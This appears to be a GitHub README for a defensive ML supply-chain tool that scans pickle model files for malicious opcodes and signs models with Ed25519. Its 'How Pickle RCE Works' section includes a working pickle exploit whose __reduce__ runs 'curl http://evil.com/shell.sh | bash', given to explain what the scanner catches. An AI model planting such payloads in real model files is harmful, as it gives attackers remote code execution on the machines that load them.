# Model-Supply-Chain-Auditor

Security tooling for ML model supply chain: pickle malware scanning, cryptographic model signing, and integrity verification.

## The Problem

ML models are distributed as serialized files (`.pkl`, `.pt`, `.h5`). Python's pickle format can execute arbitrary code during deserialization. This makes model files a supply chain attack vector — a malicious model downloaded from a hub can achieve Remote Code Execution (RCE) on the victim's machine.

**Real-world incidents:**
- HuggingFace detected malicious pickles in uploaded models (2023)
- PyTorch `.pt` files are ZIP archives containing pickle data
- Backdoored models distributed via public model registries

## Components

### 1. Pickle Malware Scanner

Disassembles pickle bytecode using Python's `pickletools` module and detects:
- `GLOBAL`/`STACK_GLOBAL` opcodes importing dangerous modules (`os`, `subprocess`, etc.)
- `REDUCE` opcodes that execute imported callables
- Known malicious patterns (reverse shells, data exfiltration)

### 2. Model Signing (Ed25519)

Cryptographic provenance chain:
1. Compute SHA-256 hash of model file
2. Sign hash with Ed25519 private key
3. Verify signature before loading any model

Ed25519 properties: deterministic, 32-byte keys, 64-byte signatures, ~62K signs/sec.

## Usage

```bash
pip install -r requirements.txt

# Quick verification
python verify.py

# Scan a pickle file
python -c "
from src.scanners import scan_pickle_file
result = scan_pickle_file('model.pkl')
print(f'Risk: {result.risk_level}')
print(f'Findings: {result.findings}')
"

# Sign a model
python -c "
from src.signing import generate_signing_keypair, sign_model, verify_model
private_key, public_key = generate_signing_keypair()
sig = sign_model('model.pt', private_key, signer='training-pipeline-v1')
print(f'Hash: {sig.model_hash}')
assert verify_model('model.pt', sig, public_key)
"
```

## What's Real vs. What's Theater

| Component | Honest Assessment |
|-----------|-------------------|
| Pickle opcode scanning | Real. Uses Python's `pickletools.genops()` — same approach as Fickling (Trail of Bits). |
| Ed25519 signing | Real cryptography via `cryptography` library. Production-grade. |
| Dangerous module detection | Catches known patterns. Novel obfuscation (lambda chains, `__builtins__` tricks) may evade. |
| Backdoor detection | NOT implemented. Would need Neural Cleanse (Wang et al., 2019) or Activation Clustering. |
| SafeTensors scanning | NOT implemented. SafeTensors format is inherently safe (no code execution). |
| SBOM generation | NOT implemented. Would integrate with CycloneDX or SPDX for full provenance. |

## How Pickle RCE Works

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl http://evil.com/shell.sh | bash",))

# This creates a pickle that executes the command when loaded
payload = pickle.dumps(Exploit())
# pickle.loads(payload)  # <-- RCE happens here
```

Our scanner detects this by parsing the opcodes WITHOUT executing them.

## References

1. Trail of Bits, "Fickling: A Python Pickle Decompiler and Analyzer" (2021)
2. OWASP LLM05: Supply Chain Vulnerabilities
3. Bernstein, D. et al. "High-speed high-security signatures" (2012) — Ed25519
4. HuggingFace, "Security at Hugging Face: Pickle Scanning" (2023)

## Author

Pooja Kiran — [@poojakira](https://github.com/poojakira)
